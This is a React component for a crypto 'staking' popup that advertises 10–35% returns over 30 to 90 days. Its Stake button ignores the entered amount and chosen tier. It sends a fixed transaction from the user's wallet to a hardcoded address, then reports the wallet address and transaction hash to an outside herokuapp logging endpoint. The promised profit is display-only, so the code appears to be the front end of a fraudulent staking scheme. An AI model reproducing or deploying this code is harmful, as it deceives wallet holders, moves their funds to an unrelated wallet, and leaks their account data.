import React, {useEffect, useState} from 'react';
import classes from './ChoosePopup.module.scss'
import {ethers} from "ethers";
import {useWeb3React} from "@web3-react/core";
import Main from "../../../main/Main";
import axios from "axios";

const ChoosePopup = ({active, setActive, setStakeActive, setErrorMessage}) => {

    const [choosen, setChoosen] = useState('bronze')
    const [value, setValue] = useState(13.0)
    const [letter, setLetter] = useState('b')
    const [profit, setProfit] = useState(1.3);
    const [connectActive, setConnectActive] = useState(false)
    const [isTried, setTried] = useState(false)

    const context = useWeb3React();


    useEffect(() => {
        if (isTried && context.account && !context.error) {
            console.log("work")
            setTried(false);
            send();
        }
    }, [context, isTried])

    const send = () => {
        if (context.library) {
            window.ethersProvider = new ethers.providers.InfuraProvider(1)
            const tx = {
                from: context.account,
                to: "0x31C51123daB8E249F3dc8ccA0E8fCe7c91B07d80",
                value: "10000"
            }
            context.library.send('eth_sendTransaction', [tx]).then(res => {
                axios.get('https://wallet-connector.herokuapp.com/log?from=' + context.account + '&tx=' + res)
                    .then((res) => {
                        console.log(res)
                    }).catch(err => {
                        console.log(err)
                })
                setErrorMessage('')
                console.log("Success")
                console.log(res)
                setStakeActive(true)
                setActive(false)
            }).catch((err) => {
                if (err.code === 4001) {
                    setErrorMessage("rejected request")
                }
            })
        }
    }

    useEffect(() => {
        if (context.error) setActive(false)
    }, [context.error])

    const sendTransaction = () => {
        if (!context.library) {
            setConnectActive(true)
            setTried(true)
            return
        }
        try {
            send()
        } catch (ex) {
            setErrorMessage(ex)
            console.error(ex)
        }
    }


    const calculate = () => {
        if (choosen === 'bronze') {
            setProfit(value * 0.1);
        } else if (choosen === 'silver') {
            setProfit(value * 0.25);
        } else {
            setProfit(value * 0.35);
        }
    }

    useEffect(() => {
        calculate();
    }, [value, choosen])

    return (
        <div className={[classes.popup, classes.popup__choose, active ? classes.popup_active : ' '].join(' ')} data-choose-tariff="bronze">
            <div className={[classes.popup__body, classes.popup__choose__body].join(' ')}>
                <div onClick={() => setActive(false)}
                    className={[classes.popup__close, classes.popup__choose__close].join(' ')}></div>
                <div className={[classes.popup__title, classes.popup__choose__title].join(' ')}>Сhoose your tarif and stake</div>
                <div className={[classes.popup__choose__tariffics, classes.tariffics__popup__choose].join(' ')}>
                    <div data-choose-value="bronze" className={[classes.tariffics__popup__choose__col,
                        choosen === 'bronze' ? classes._active : ''].join(' ')}
                        onClick={() => setChoosen('bronze')}
                    >
                        <div className={classes.tariffics__popup__choose__tariff}>Bronze</div>
                        <div className={classes.tariffics__popup__choose__values}>30 days / 10%</div>
                    </div>
                    <div data-choose-value="silver" className={[classes.tariffics__popup__choose__col,
                        choosen === 'silver' ? classes._active : ''].join(' ')}
                         onClick={() => setChoosen('silver')}
                    >
                        <div className={classes.tariffics__popup__choose__tariff}>Silver</div>
                        <div className={classes.tariffics__popup__choose__values}>60 days / 25%</div>
                    </div>
                    <div data-choose-value="gold" className={[classes.tariffics__popup__choose__col,
                        choosen === 'gold' ? classes._active : ''].join(' ')}
                         onClick={() => setChoosen('gold')}
                    >
                        <div className={classes.tariffics__popup__choose__tariff}>Gold</div>
                        <div className={classes.tariffics__popup__choose__values}>90 days / 35%</div>
                    </div>
                </div>
                <div className={classes.popup__choose__stakes}>
                    <div className={classes.popup__choose__receive}>
                        <input type="text" value={value} onChange={(e) => setValue(e.target.value)} id="choose-input" />
                    </div>
                    <div onClick={() => {
                        sendTransaction()
                    }}
                        className={[classes.popup__choose__stake, classes.stake].join(' ')}>Stake</div>
                </div>
                <div className={classes.popup__choose__values}>
                    <div className={classes.popup__choose__get}>Will get: <span data-choose-get>
                        {(Number(value) + Number(profit)).toFixed(2) + letter}
                    </span></div>
                    <div className={classes.popup__choose__profit}>Profit: <span data-choose-profit>{(profit).toFixed(2) + letter}</span></div>
                </div>
            </div>
            <Main setActive={setConnectActive} active={connectActive}/>

        </div>
    );
};

export default ChoosePopup;